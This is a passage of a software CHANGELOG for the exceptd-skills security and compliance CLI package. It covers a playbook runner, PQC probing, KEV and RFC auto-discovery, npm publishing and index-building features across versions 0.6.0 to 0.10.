- `domain`: structured `attack_class` (tight enum of 18 classes, every one backed by a shipped skill — no speculative entries) + ATLAS / ATT&CK / CVE / CWE / D3FEND refs + `frameworks_in_scope` (20+ framework IDs).
- `phases.govern`: jurisdiction obligations (window_hours + clock_starts), theater fingerprints, framework gap context with lag_score, skill_preload.
- `phases.direct`: threat_context with current CVEs/dates, RWEP threshold (escalate/monitor/close), framework_lag_declaration, skill_chain, token_budget.
- `phases.look`: typed artifacts (14 types incl. mcp_manifest / syscall_trace / embedding_store), collection_scope, environment_assumptions with if_false branches, fallback_if_unavailable with confidence_impact.
- `phases.detect`: typed indicators (12 types incl. prompt_pattern / embedding_anomaly / syscall_sequence) with deterministic boolean, false_positive_profile, minimum_signal (detected | inconclusive | not_detected).
- `phases.analyze`: rwep_inputs (signal → factor → weight), blast_radius_model (1-5 rubric), compliance_theater_check (claim / audit_evidence / reality_test / theater_verdict_if_gap), framework_gap_mapping, escalation_criteria.
- `phases.validate`: remediation_paths (priority-sorted with preconditions), validation_tests (functional / negative / regression / exploit_replay), residual_risk_statement (acceptance_level operator/manager/ciso/board), evidence_requirements (typed + retention_period + framework_satisfied), regression_trigger.
- `phases.close`: evidence_package (CSAF-2.0 / STIX-2.1 / markdown / pdf, Ed25519-signed by default), learning_loop writing to zeroday-lessons.json, notification_actions with ISO 8601 deadlines computed from clock_starts + window_hours, exception_generation with auditor_ready_language, regression_schedule.
- `directives[]`: each declares `applies_to` (cve / atlas_ttp / attack_technique / always) and optional `phase_overrides` letting one playbook handle multiple related conditions.

### New engine

`lib/playbook-runner.js` (~700 lines) implements the seven phases:

- `listPlaybooks` / `loadPlaybook` / `plan` (full session map).
- `preflight` enforces threat_currency_score gates (<50 hard-block unless `forceStale=true`, <70 warns), evaluates `_meta.preconditions` with on_fail halt/warn/skip_phase, enforces `_meta.mutex` against an in-process active-runs set.
- `govern` returns jurisdiction obligations + theater fingerprints + framework gap summary + skill_preload for the host AI to load.
- `direct` returns threat_context + RWEP threshold + skill_chain + token budget.
- `look` emits the typed-artifact collection plan; honors `air_gap_alternative` when `_meta.air_gap_mode=true`.
- `detect` accepts agent observations + signal_overrides, applies the false_positive_profile, classifies the signal as detected / inconclusive / not_detected.
- `analyze` resolves matched CVEs from `domain.cve_refs` via `cross-ref-api`, composes RWEP from base catalog score + per-input weighted adjustments, scores blast radius per rubric, runs the theater verdict, generates framework_gap_mapping entries per matched CVE, fires escalation_criteria.
- `validate` picks the highest-priority remediation_path whose preconditions hold, emits validation_tests including exploit_replay-class, renders residual_risk_statement, lists evidence_requirements per framework satisfied, computes regression next_run from soonest trigger.
- `close` assembles a CSAF-2.0 evidence bundle (HMAC-signed when a session_key is provided; Ed25519-signing path pending separate `sign-evidence` ceremony), drafts the learning_loop lesson with attack_vector / control_gap / framework_gap / new_control_requirement, computes notification_actions ISO deadlines from `clock_starts` events + `window_hours`, evaluates `exception_generation.trigger_condition` and renders the `auditor_ready_language` with finding context interpolated, finalizes the regression schedule, lists downstream playbooks per `_meta.feeds_into`.
- `run` orchestrates the full chain in one call. Emits a stable `evidence_hash` for re-attestation. Mutex enforced via try/finally on `_activeRuns`.

`lib/cross-ref-api.js` is the pure read-only knowledge layer (`byCve` / `byCwe` / `byTtp` / `bySkill` / `byFramework` / `recipesFor` / `theaterTestsFor` / `globalFrameworkContext`) the analyze phase composes against.

### Playbooks

`data/playbooks/` ships 11 playbooks covering: kernel, mcp, crypto, ai-api, framework, sbom, runtime, hardening, secrets, cred-stores, containers. Each playbook is a complete seven-phase contract; each declares ≥ 2 directives; each lists at least one applicable jurisdiction obligation; each populates a compliance_theater_check that distinguishes paper compliance from actual exposure.

### Tests

`tests/playbook-runner.test.js` covers preflight (currency gate / preconditions / mutex), phase resolution (deepMerge + phase_overrides), all seven phases, run() end-to-end, edge cases, and the evalCondition expression DSL. ~30-50 cases; runs serial under `--test-concurrency=1`.

### CLI

New verbs: `exceptd plan` / `govern <pb>` / `direct <pb>` / `look <pb>` / `run <pb> --evidence <file|->` / `ingest` (alias of `run`) / `reattest <session-id>`. JSON to stdout by default; `--pretty` for indented. `--air-gap` honors `_meta.air_gap_mode`. `--force-stale` overrides the currency hard-block.

### Deprecated

`exceptd scan` remains as a legacy alias that runs the pre-v0.10 hardcoded probes. New code should call `exceptd plan` / `exceptd run` instead. The scanner emits a banner at startup pointing operators at the new contract; it will be removed in v1.0.

### AGENTS.md

New section "Seven-phase playbook contract" teaches host AIs how to invoke the runner, what each phase requires of them, and what they MUST and MUST NOT do at each phase. Includes a worked example walking a kernel-LPE investigation from govern through close with realistic deadline computation.

## 0.9.5 — 2026-05-12

**Pin: six operator-reported bug fixes from real CLI use.**

### Bug 1 — Currency formula penalized `forward_watch` entries

`pipeline.js` and `scripts/builders/currency.js` subtracted 5 points per `forward_watch` item, so a skill that diligently tracked 14 upcoming threats scored **30%** the day after a review. Perverse incentive: punished skills doing the right thing. **Fix**: `forward_watch` no longer affects the score — currency is now a pure function of age-since-last_threat_review. `cloud-security` jumped from 30% → 100%; `sector-financial` from 40% → 100%; etc. The decay-formula docstring documents the change.

### Bug 2 — `exceptd report executive` mixed currency thresholds in messaging

Earlier output mixed `< 70%` ("skills need review") with `< 50%` ("require immediate update") in the same block, which read inconsistently. **Fix**: report now splits into two named tiers with the threshold inline:
- *Critical-stale* (`< 50%`, `> 90` days)
- *Stale* (`50-69%`, `30-90` days)

### Bug 3 — PQC scanner stopped at "verify ML-KEM/ML-DSA"

The scanner detected OpenSSL 3.5+ as "PQC-capable" but never actually probed for the algorithms. **Fix**: new `probePqcAlgorithms()` queries the runtime via three channels (Node `crypto.kemEncapsulate`/`getCurves`/`getHashes`/`getCiphers`, `openssl list -kem-algorithms`, `openssl list -signature-algorithms`) and returns boolean availability flags. Probes **22 algorithm flags** across the full emerging PQC landscape:

| Tier | Algorithms |
|---|---|
| **NIST finalized (FIPS 203/204/205)** | ML-KEM (Kyber), ML-DSA (Dilithium), SLH-DSA (SPHINCS+) |
| **NIST draft / alternate** | FN-DSA (Falcon, FIPS 206 draft), HQC (alternate KEM, March 2025) |
| **NIST Round-4 / niche** | FrodoKEM, NTRU / NTRU-Prime, Classic McEliece, BIKE |
| **NIST signature on-ramp (Round 2, 2024+)** | HAWK, MAYO, SQIsign, CROSS, UOV/SNOVA, SDitH, MIRATH, FAEST, PERK |
| **Stateful hash sigs** | LMS (RFC 8554), XMSS (RFC 8391), HSS |
| **IETF composite / hybrid** | composite signatures (RSA+ML-DSA, ECDSA+ML-DSA, etc.), composite KEMs (X25519+ML-KEM) |

The scanner finding now surfaces per-algo `provider_hint` so an operator can tell whether availability came from Node's runtime, the OpenSSL provider, or OQS.

### Bug 4 — Dispatcher hid CVE IDs behind aggregate counts

`dispatch` previously said *"1 CISA KEV CVE with RWEP ≥ 90"* without naming the CVE. **Fix**: dispatcher threads the per-finding `items[]` array into each plan entry as an `evidence` block. The print path renders each CVE explicitly:
```
[CRITICAL] compliance-theater
  Triggered by: cisa_kev_high_rwep (framework)
  Action: 1 CISA KEV CVEs with RWEP >= 90...
  Evidence:
    - CVE-2026-31431 · "Copy Fail" · RWEP 90
```

### Bug 5 — `exceptd verify` succeeded without disclosing key fingerprint

A swapped `keys/public.pem` would still produce *"38/38 passed"* — operators had no way to detect key substitution from the exit code alone. **Fix**: verify now prints **both SHA-256 and SHA3-512** fingerprints of the public key:

```
[verify] Public key: keys/public.pem
[verify] SHA256:jD19nBPExofyiO60loNQgx5ONUbrwxG8XZM8Hh7pV+w=
[verify] SHA3-512:okdinIchi8kMtlhOyYmDquwaRw2TSpJFe9MjfGpGI+7mE5dwPy5ZUVG4Hx1PB9KJkInLAzemhE1gsmhjZ0USww==
```

SHA-256 matches `ssh-keygen -lf` / GPG / npm-provenance / Sigstore conventions; SHA3-512 hedges against SHA-2 family weaknesses with the same Keccak family ML-KEM/ML-DSA use internally. Operators pin one (or both) out-of-band.

### Bug 6 — `framework-gap-analysis` had no programmatic CLI runner

Earlier `exceptd dispatch` would say *"run framework-gap-analysis"* but the only thing the CLI could actually do was `exceptd skill framework-gap-analysis` to dump the body. **Fix**: new `exceptd framework-gap <FRAMEWORK_ID|all> <SCENARIO|CVE-ID> [--json]` subcommand executes the analytical path in `lib/framework-gap.js`. Produces structured human or JSON output covering matching gaps, universal gaps, theater-risk controls per framework.

Examples:
```bash
exceptd framework-gap NIST-800-53 CVE-2026-31431
exceptd framework-gap PCI-DSS-4.0 "prompt injection"
exceptd framework-gap all CVE-2025-53773 --json
```

## 0.9.4 — 2026-05-12

**Pin: drop upper bound on Node engine requirement.**

`package.json` `engines.node` goes from `>=24.0.0 <25.0.0` to `>=24.0.0`. The strict upper bound emitted `EBADENGINE` warnings on Node 25+ installs even though the code works fine — the project uses only Node stdlib APIs that have been stable since Node 18.

## 0.9.3 — 2026-05-12

**Pin: expand RFC auto-discovery seed list for broader project coverage.**

`SEED_RFC_GROUPS` grows from 35 → 48 working groups. The v0.9.2 seed focused on transport/crypto/PKI/identity which is core but missed several IETF areas the project actually depends on:

| Added WG | Why it matters |
|---|---|
| `wimse` | Workload Identity in Multi-System Environments — federal zero-trust mandates, cloud-native workload identity. Touches identity-assurance + sector-federal-government skills. |
| `gnap` | Grant Negotiation and Authorization Protocol — OAuth 2 successor. |
| `ace` | Authentication & Authorization for Constrained Environments — OT/ICS auth. |
| `core` | Constrained RESTful Environments (CoAP) — IoT supply chain. |
| `cbor` | Foundation for COSE, attestation tokens, SCITT receipts. |
| `trans` | Certificate Transparency — compliance evidence for cert issuance. |
| `ntp` | Network Time Protocol — audit trails need monotonic time (DORA, NYDFS, NIS2 breach clocks). |
| `opsawg` | Operations and Management Area WG — operational telemetry. |
| `opsec` | Operational Security Area — security guidance for operators. |
| `dance` | DANE Authentication for Named Entities Enhancements — DNS-anchored TLS trust. |
| `netmod` | NETCONF data modeling — YANG security models. |
| `jsonschema` | JSON Schema (now an IETF working group) — DB validation, API schemas, security policy serialization. |
| `httpapi` (existed) → confirmed | HTTP API standards (already there from v0.9.2). |

Test breadth assertion bumped from `>= 30` to `>= 40` WGs. Same dynamic-derivation behavior on top (union with cache-derived WGs from rfc-references.json's Datatracker docs).

**Database coverage rationale**: IETF doesn't have a "database" WG because DB wire protocols (Postgres, MongoDB, etc.) aren't IETF-standardized. The security infrastructure databases USE — TLS for connections, SASL/Kerberos auth, workload identity, field encryption, audit-trail time anchoring, cert validation, access-control sync — is all covered by the WGs above. `jsonschema` adds the DB+API+policy schema validation layer that was previously missing.

## 0.9.2 — 2026-05-12

**Pin: auto-discovery for KEV + IETF catalogs.** The refresh workflow now adds *new* catalog entries automatically instead of only updating existing ones.

### What changed

- **CISA KEV discovery** — when CISA adds a new CVE to the Known Exploited Vulnerabilities list, the next nightly refresh detects it (cached KEV feed entry, not in local `data/cve-catalog.json`) and emits a draft entry. NVD CVSS metrics + EPSS score pulled from the prefetch cache when available; nulled otherwise. Initial RWEP score computed via `lib/scoring.js` with KEV=true + suspected exploitation + reboot-required = baseline ~55.
- **IETF RFC discovery** — Datatracker query against project-relevant working groups returns recent RFCs not in `data/rfc-references.json`. WG filter is the union of (a) dynamically derived from cached Datatracker docs on currently-cited RFCs, plus (b) a curated seed list of 35 WGs covering crypto/PKI/TLS, identity/auth/SSO, supply chain/attestation (`scitt` / `rats` / `suit` / `teep`), threat intel (`mile` / `sacm`), DNS security, messaging E2E, and IoT mgmt. Seed list documented in `lib/auto-discovery.js`.
- **Draft entry annotation** — every auto-imported entry carries an `_auto_imported` block:
  ```jsonc
  "_auto_imported": {
    "source": "KEV discovery",
    "imported_at": "2026-05-12",
    "curation_needed": [
      "type (LPE/RCE/SSRF/etc.)",
      "framework_control_gaps mapping",
      "atlas_refs + attack_refs categorization",
      ...
    ]
  }
  ```
  Mechanical fields (CVSS, KEV, EPSS, name, vendor) get populated; analytical fields (framework_control_gaps, ATLAS/ATT&CK refs, type classification) stay null and are listed for human curation.
- **PR body** in `refresh.yml` now splits cleanly: **"New entries (auto-imported — needs human curation)"** table first, then **"Updates to existing entries"** table. New label `needs-curation` added alongside the existing `data-refresh` + `automation`.
- **Volume cap** — 20 new entries per PR per source (configurable via `DEFAULT_CAP`). Spill is reported in the summary so a CISA mass-add doesn't generate an unreviewable PR.

### `lib/auto-discovery.js` (new module, ~280 lines, zero deps)

- `discoverNewKev(ctx, cap?)` — KEV → array of `op:"add"` diffs
- `discoverNewRfcs(ctx, opts?)` — RFC discovery via Datatracker WG queries
- `buildKevDraftEntry(kev, nvd?, epss?)` — pure function, no I/O, easy to test
- `getProjectRfcGroups(ctx)` — union of cache-derived + `SEED_RFC_GROUPS`
- `SEED_RFC_GROUPS` — curated WG list (exported for testing + transparency)

### `lib/refresh-external.js` changes

- `KEV_SOURCE.fetchDiff` now merges drift-check + discovery in cache mode (`kevDiffWithDiscoveryFromCache`)
- `RFC_SOURCE.fetchDiff` same pattern (`rfcDiffWithDiscoveryFromCache` — drift from cache, discovery live)
- `applyDiff` handlers learn the new `op: "add"` diff shape and insert entries verbatim. Returns enriched stats: `{ updated, added, drift_updated, errors }`.

### Tests

`tests/auto-discovery.test.js` — 9 new tests:
- Seed WG breadth (must include `tls`, `oauth`, `scitt`, `rats`, `dnsop`, `acme`, `mls`, etc.)
- `buildKevDraftEntry` populates all required schema fields
- NVD CVSS + CWE extraction
- EPSS score extraction
- Empty result when KEV cache missing
- New CVE detection (filters out CVEs already in local catalog)
- Volume cap + spill counting
- RWEP score bounded 0–100

### Operational note

The first run after deploy will likely pick up **8 new KEV entries** from the past ~5 days of CISA activity (visible in `/api/intel` already). These appear in the next auto-PR as a curated batch.

## 0.9.1 — 2026-05-11

**Patch: test-runner concurrency fix for first npm publish.**

The v0.9.0 release workflow failed at the predeploy `Run tests` gate on the Linux CI runner with a byte-stability assertion on `data/_indexes/section-offsets.json`. Root cause: the Node test runner defaults to running test files in parallel, and three test files (`tests/build-incremental.test.js`, `tests/indexes-v070.test.js`, `tests/refresh-*.test.js`) all manipulate shared filesystem state under `data/_indexes/` + `refresh-report.json` + skill bodies. The `build-incremental` test that temporarily touches `skills/compliance-theater/skill.md` races against the idempotence assertion in `indexes-v070`, producing a different `section-offsets.json` snapshot between the two reads.

Fix: add `--test-concurrency=1` to both `npm test` and the predeploy test gate. Sequential file execution adds ~1.5s locally and eliminates the race entirely. No code or schema changes — only the test runner flag.

Tag rule on the remote prevented rewriting `v0.9.0` (correctly — published tags are immutable by repo policy), so this version becomes the actual first npm publish under `@blamejs/exceptd-skills`. `v0.9.0` on the remote remains as a historical marker for the failed release attempt.

## 0.9.0 — 2026-05-11

**Minor: npm distribution. Package is now `@blamejs/exceptd-skills` on npm with provenance attestation.** Adds a clean `npx` install path for AI consumers and operators, a single-entry-point `exceptd` CLI that dispatches to every internal command, a tag-triggered release workflow with GitHub OIDC-signed provenance, and a new predeploy gate that checks the publish tarball shape on every commit.

### npm publishing

- **Package name**: `@blamejs/exceptd-skills` (was `exceptd-security`, never published)
- **Distribution**: `https://www.npmjs.com/package/@blamejs/exceptd-skills`
- **Provenance**: every release tarball is signed via GitHub OIDC + npm `--provenance`. Consumers can verify with `npm audit signatures`.
- **`publishConfig.access`**: `public` (scoped public packages need this explicit)
- **`files`** whitelist replaces the previous `private: true` block — only `bin/`, `lib/`, `orchestrator/`, `scripts/`, `vendor/`, `agents/`, `data/`, `skills/`, `keys/public.pem`, and top-level docs ship. Tests, `.cache/`, `.keys/`, `refresh-report.json`, dev tooling are excluded.
- **Tarball**: ~860 KB packed / 3 MB unpacked / 136 files.

### `bin/exceptd.js` CLI

Single executable, exposed as `exceptd` after install. Dispatches to every existing script:

```
npx @blamejs/exceptd-skills path                          # absolute install path
npx @blamejs/exceptd-skills prefetch
npx @blamejs/exceptd-skills refresh --from-cache --swarm
npx @blamejs/exceptd-skills build-indexes --changed --parallel
npx @blamejs/exceptd-skills validate-cves --from-cache
npx @blamejs/exceptd-skills currency
npx @blamejs/exceptd-skills skill kernel-lpe-triage
```

The `exceptd path` subcommand is the recommended way for downstream AI consumers to discover where the installed package lives — they point their assistant at `<path>/AGENTS.md` + `<path>/data/_indexes/summary-cards.json` without needing to know the npm install location.

### Release workflow `.github/workflows/release.yml`

- **Trigger**: tag push matching `v*.*.*` (or `workflow_dispatch` for dry-runs)
- **Gates**: verifies tag ↔ package.json version match → `npm install --no-audit --no-fund` (asserts zero deps) → `npm run bootstrap` → `npm run predeploy` (all 13 gates) → `npm pack --dry-run` preview → `npm publish --access public --provenance` → GitHub Release with the CHANGELOG section as the body
- **Permissions**: `contents: write` + `id-token: write` (OIDC for provenance)
- **Secrets**: `NPM_TOKEN` (granular automation token, scoped to `@blamejs/exceptd-skills` only)
- **Dry-run mode**: `workflow_dispatch` with `dry_run: true` skips the `npm publish` and GitHub Release steps but runs everything else

### `validate-package` predeploy gate

New gate (#13 in the predeploy sequence). Runs `npm pack --dry-run --json` and asserts:

- Every required file (README, LICENSE, NOTICE, AGENTS, manifest, sbom, bin, lib leaves, vendor leaves, data/_indexes/_meta, keys/public.pem) is present in the publish tarball
- No forbidden file (`.keys/`, `.cache/`, `tests/`, `refresh-report.json`, `.env*`, `node_modules/`, any non-public `.pem`) is in the publish tarball
- Tarball size is under 5 MB
- `bin/exceptd.js` has a `#!/usr/bin/env node` shebang
- `package.json` invariants: not private, has `bin.exceptd`, has `files[]`, has `publishConfig.access: public` + `provenance: true`

Predeploy gate count: **12 → 13**. All green on this release.

### Other changes

- **README rewrite**: three audience paths (AI consumer / operator / maintainer), npx install instructions, full CLI command reference, pre-computed indexes summary. npm badge added back alongside the release badge.
- **MAINTAINERS.md release runbook**: full one-time setup + per-release procedure + dry-run instructions + rollback options + consumer verification commands.
- **SBOM updates**: package's own `bom-ref` switches from `pkg:project/exceptd-skills@version` to canonical PURL `pkg:npm/@blamejs/exceptd-skills@version`. Adds `externalReferences` linking to the npm package page + GitHub repo.
- **Tests**: 10 new in `tests/bin-dispatcher.test.js`. Covers help, version, path, alias flags, unknown command, orchestrator passthrough, package.json publish-readiness invariants.
- **package.json updates**: keywords array for npm discoverability (`ai-security`, `compliance`, `cve`, `kev`, `mcp`, `prompt-injection`, `rwep`, `threat-intelligence`, etc.), explicit `author` field, `prepublishOnly` runs `predeploy + validate-package` so an accidental `npm publish` can't skip the gates.

### Operator workflows

The npm distribution doesn't change how the project is used. It just gives a cleaner install path:

```
# Previously: required git clone + npm run bootstrap
git clone https://github.com/blamejs/exceptd-skills && cd exceptd-skills && npm run bootstrap

# Now: one command, no clone, no install
npx @blamejs/exceptd-skills path
npx @blamejs/exceptd-skills prefetch
```

Maintainers still clone + `npm run bootstrap` + `npm run predeploy` for active development.

### Release this version

This release ships the npm publish infrastructure but does NOT itself publish. To publish v0.9.0 to npm, the maintainer must push the `v0.9.0` tag (after this commit lands on `main`) and supply `NPM_TOKEN` in repo secrets. See `MAINTAINERS.md` § "Release runbook" for the full procedure.

## 0.8.0 — 2026-05-11

**Minor: prefetch cache + queue/retry/worker primitives + incremental build + swarm fan-out.** Adds the infrastructure to (a) warm a local cache of every upstream artifact so refresh/validate work without re-paying network cost, (b) run source fetches and builders in parallel, (c) rebuild only what changed since the last build. Also vendors `retry.js` + `worker-pool.js` from blamejs so battle-tested retry/threading semantics aren't reinvented.

### Vendored from blamejs (Apache-2.0)

- `vendor/blamejs/retry.js` — flattened and stripped from `blamejs@1442f17/lib/retry.js`. Provides `withRetry`, `isRetryable`, `backoffDelay`, `CircuitBreaker`. Stripped: observability sink, audit hooks, `numeric-checks` dep, `safeAsync.sleep` (replaced with stdlib AbortSignal-aware sleep). Documented exceptd delta: the sleep timer is NOT `unref`'d (one-shot CLI callers need the event loop kept alive while the backoff completes).
- `vendor/blamejs/worker-pool.js` — flattened and stripped from `blamejs@1442f17/lib/worker-pool.js`. Provides `create(scriptPath, opts) → { run, drain, terminate, stats }` with bounded concurrency, bounded queue depth, per-task timeout, and worker recycle. Stripped: `WorkerPoolError` class (replaced with `Error` carrying a `code` field), `validate-opts` / `numeric-bounds` / `constants` deps, audit sink.
- `vendor/blamejs/_PROVENANCE.json` — pinned commit, vendored sha256 + upstream sha256 at pin, strip rules per file, exceptd-deltas.
- `vendor/blamejs/README.md` + `vendor/blamejs/LICENSE` — re-vendor instructions + Apache-2.0 license text.
- `NOTICE` updated with full attribution paragraph.

### New `lib/` primitives

- **`lib/job-queue.js`** — async queue with per-source concurrency caps, token-bucket rate limiting, priority ordering, and per-source stats. Retry classification + exponential backoff delegated to vendored `retry.js`. Used by the upstream-fetch path of `refresh-external` and (transitively) `prefetch`.
- **`lib/worker-pool.js`** — thin wrapper over vendored `worker-pool` providing a `WorkerPool` class + `runAll(tasks)` helper. Available to any caller wanting CPU fan-out, used today by the `--parallel` test harness pattern.
- **`lib/prefetch.js`** — downloads and caches every upstream artifact this project consumes into `.cache/upstream/` (gitignored). Layout: `_index.json` + `<source>/<id>.json`. Sources: `kev` (CISA), `nvd`, `epss`, `rfc` (IETF Datatracker), `pins` (MITRE GitHub releases). Per-source rate budgets via JobQueue. `--max-age <dur>` to skip fresh entries, `--source <names>` filter, `--force`, `--no-network` (dry-run plan).
- **`lib/validate-vendor.js`** — predeploy gate. Re-hashes every vendored file and compares to `_PROVENANCE.json`; smoke-loads each via `require()`. Silent hand-edits to a vendored copy fail the build.

### refresh-external — cache + swarm + report-out

- **`--from-cache [<dir>]`** — read every source from the prefetch cache instead of upstream. Default path `.cache/upstream`. Combine with `--apply` for fully-offline upserts.
- **`--swarm`** — fan-out source fetches across worker threads (`Promise.all`-based). Best paired with `--from-cache` so the parallel workers don't compete for upstream rate budgets. Report shape is identical to sequential mode.
- **`--report-out <path>`** — redirect the `refresh-report.json` artifact so parallel test suites don't race on the shared file at the repo root.
- Cache helpers per source (`kevDiffFromCache`, `epssDiffFromCache`, `nvdDiffFromCache`, `rfcDiffFromCache`, `pinsDiffFromCache`) — synthesize the same `ValidationResult` shape downstream consumers already understand.

### validate-cves / validate-rfcs — cache-first

- Both now accept **`--from-cache [<dir>]`**. When set, the orchestrator opportunistically reads NVD/KEV/EPSS (CVEs) or Datatracker (RFCs) records from the prefetch cache and falls through to live network on per-entry cache misses. Reports `cache hits` / `live fallbacks` at the end of the run. Logs the cache directory in the mode banner.
- `validateAllCvesPreferCache(catalog, cacheDir)` is the new orchestrator-internal helper; it produces the same shape `validateAllCves` does so existing print-and-fail logic doesn't fork.

### build-indexes — incremental + parallel + selective

- Refactored to a declarative outputs registry. Each output declares its source-file dependencies (`deps`) + any produced-output prerequisites (`dependsOn`, e.g. `token-budget` needs `section-offsets` on disk first).
- **`--only <names>`** — rebuild specific outputs (and their dependency closure).
- **`--changed`** — rebuild only outputs whose declared deps changed since the last `_meta.json` snapshot. CI-safe: identical inputs produce identical outputs. Allowed in CI per project decision.
- **`--parallel`** — run independent outputs concurrently via `Promise.all()`. Same byte-identical output as sequential mode (verified by `tests/build-incremental.test.js`).
- No-op short-circuit when `--changed` finds zero changed sources: `_meta.json` is re-written with the current hashes so the freshness gate stays correct.

### CI workflow updates

- **`.github/workflows/refresh.yml`** — adds a `Warm upstream cache` step before the dry-run that uses `npm run prefetch`. The subsequent refresh runs use `--from-cache .cache/upstream --swarm` for parallel apply against cached data. Eliminates parallel-fetch rate-limit contention.
- **`.github/workflows/ci.yml`** — data-integrity job picks up the new `validate-indexes` and `validate-vendor` gates (previously only enforced via predeploy).

### Predeploy

12 gates now (was 11). New: **Vendor tree integrity** (`validate-vendor`). 12/12 green on this release.

### npm scripts

- `prefetch`, `prefetch:dry`
- `refresh:from-cache`, `refresh:swarm`
- `validate-vendor`

### Tests

- **`tests/job-queue.test.js`** — concurrency cap, priority order, transient-retry via vendored classifier, no retry on 4xx, drain, queue_meta propagation. 7 tests.
- **`tests/worker-pool.test.js`** — single dispatch, parallelism wall-clock check, worker-reported error, scriptPath validation. 5 tests.
- **`tests/prefetch.test.js`** — dry-run produces empty cache, source filter, `SOURCES` shape, `readCached` freshness + `allowStale`, unknown source rejection. 5 tests.
- **`tests/build-incremental.test.js`** — `--only` dependency closure (`token-budget` pulls in `section-offsets`), unknown name rejection, `--changed` no-op when sources unchanged, `--changed` picks up a touched skill body, `--parallel` produces byte-identical output, `OUTPUTS` registry parity. 6 tests.
- **`tests/refresh-swarm.test.js`** — swarm vs. sequential report parity, `--from-cache` reads cache layout, `--from-cache <nonexistent>` exits non-zero. 3 tests.

### SBOM

`sbom.cdx.json` `components` array now lists the vendored files as proper CycloneDX library components with SHA-256 hashes, source repo, pinned commit, and an `externalReferences` link back to upstream. Metadata properties add `exceptd:vendor:count` and `exceptd:vendor:pin`.

## 0.7.0 — 2026-05-11

**Minor: tier-2/3/4 derived indexes + external-data refresh automation.** Builds on v0.6.0's six-index baseline with eleven more pre-computed indexes for AI-consumer ergonomics, plus a scheduled GitHub Actions job that pulls upstream KEV/EPSS/NVD/RFC data and either upserts catalogs or opens issues for version-pin bumps.

### New indexes (eleven, under `data/_indexes/`)

| File | Purpose |
|---|---|
| `summary-cards.json` | Per-skill 100-word abstract: description, Threat Context excerpt, what it produces, key cross-refs, handoff targets. Saves the `researcher` skill from parsing each routed skill's body to summarize. |
| `section-offsets.json` | Per-skill byte/line offsets of every H2 section. Consumers slice a single section (e.g. "Compliance Theater Check") from disk instead of reading the whole body. Fence-aware — code-block `## Foo` lines are not counted. |
| `chains.json` (extended) | Pre-computed cross-walks now keyed by both CVE-id and CWE-id. CWE chains hydrate skills citing the CWE, plus related CVEs reached through the skill graph. |
| `token-budget.json` | Approximate token cost per skill + per section. Lets AI consumers budget context cost before loading. |
| `recipes.json` | 8 curated multi-skill recipes for common ops use cases: AI red team prep, PCI 4.0 audit defense, federal IR, DORA TLPT scoping, K-12 EdTech privacy review, ransomware tabletop, new-CVE triage, OSS dep triage. |
| `jurisdiction-clocks.json` | Normalized jurisdiction × obligation × hours matrix (breach notification, patch SLA). 29 jurisdictions, derived from `data/global-frameworks.json`. |
| `did-ladders.json` | Canonical defense-in-depth ladders per attack class (prompt injection, kernel LPE, AI-C2, ransomware, supply chain, BOLA, model exfiltration, BEC). Each layer references the source skill + D3FEND id backing it. |
| `theater-fingerprints.json` | Structured records for the 7 compliance-theater patterns: claim, audit evidence, reality, fast detection test, controls implicated, evidence CVE / campaign. Inverted by control id. |
| `currency.json` | Pre-computed skill currency snapshot against `manifest.threat_review_date` (deterministic). Saves the watchlist/scheduler from re-running `orchestrator currency`. |
| `frequency.json` | Citation-count tables per catalog field (CWE / ATLAS / ATT&CK / D3FEND / framework_gap / RFC / DLP). Surfaces load-bearing entries and orphan-adjacent ones. |
| `activity-feed.json` | "What changed when" feed across skills + catalogs, sorted descending. Lightweight RSS. |
| `catalog-summaries.json` | Compact per-catalog summary cards: purpose, schema version, last-updated, TLP, source confidence, entry count. |
| `stale-content.json` | Persisted snapshot of audit-cross-skill stale-content findings (renamed-skill tokens, README badge drift, researcher count claim, stale skill reviews, stale catalog freshness). Deterministic against `manifest.threat_review_date`. |

### Builder restructure

`scripts/build-indexes.js` now orchestrates `scripts/builders/*.js` — one module per index. The main script keeps the v0.6.0 outputs inline and delegates new outputs. All builders are zero-dep Node 24 stdlib.

`_meta.json` now records source SHA-256 hashes for 49 files (manifest + 10 catalogs + 38 skills) and stamps every new index with stats.

### External-data refresh automation

- **`lib/refresh-external.js`** — new orchestrator. Five source modules: KEV (CISA), EPSS (FIRST.org), NVD (CVSS metrics), RFC (IETF Datatracker), and PINS (MITRE ATLAS / ATT&CK / D3FEND / CWE upstream releases). Each module returns a diff list; `--apply` writes upserts back to the local catalog, bumps `last_verified`, then rebuilds indexes. PINS is intentionally **report-only** per AGENTS.md Hard Rule #12 — version-pin bumps require audit, surfaced as a GitHub issue instead of an auto-PR.
- **`sources/validators/version-pin-validator.js`** — checks ATLAS, ATT&CK, D3FEND, and CWE GitHub releases against the local pin.
- **`.github/workflows/refresh.yml`** — daily 06:00 UTC dry-run + apply; weekly 06:30 UTC version-pin slot. On diffs, opens an auto-PR (`data-refresh/auto` branch, labels `data-refresh` + `automation`). On pin drift, opens an issue (labels `version-pin` + `automation` + `minor-update`). Uses `NVD_API_KEY` secret if available.
- **`tests/fixtures/refresh/`** — frozen fixture payloads (kev / epss / nvd / rfc / pins .json) so the test suite exercises the orchestrator deterministically with no network.
- **`tests/refresh-external.test.js`** — 8 tests covering dry-run, `--source` filter, `--help`, fixture-mode determinism, fixture/source-module parity.

### `npm run` additions

- `refresh` / `refresh:dry` — dry-run all sources, write `refresh-report.json`
- `refresh:apply` — apply diffs + rebuild indexes
- `refresh:offline` — fixture-mode run, never touches network

`refresh-report.json` is gitignored — CI uploads it as an artifact.

### Test coverage

- `tests/indexes-v070.test.js` — 16 new tests across the 13 new/extended index files. Covers shape, cross-references to real skills + catalogs, byte-stability across rebuilds (idempotence).

### Internal fixes during this release

- `scripts/builders/section-offsets.js` skips code-fenced `## ` lines so output-template H2s (e.g. inside `### Output Format` code blocks) don't get mistaken for real section boundaries.
- `scripts/builders/summary-cards.js` extractor skips leading H3 / metadata / table-separator lines before grabbing the first prose paragraph for `threat_context_excerpt`.
- `scripts/builders/theater-fingerprints.js` properly skips the `### Pattern N:` header line before scanning for the next H2 boundary (otherwise the section block collapsed to a single char).

## 0.6.0 — 2026-05-11

**Minor: derived-data indexes layer for AI-consumer token efficiency.** Real bottleneck for skill use is token cost (AI consumers loading 1.6 MB of catalogs + skill bodies to answer one cross-reference question), not parse speed (every operation was already sub-5ms). This release adds a pre-computed derived-data layer at `data/_indexes/`.

### New `data/_indexes/` directory

Six derived index files. Never hand-edited; regenerated by `npm run build-indexes` after any source change. A `_meta.json` records SHA-256 of every source file so the new predeploy gate detects staleness automatically.

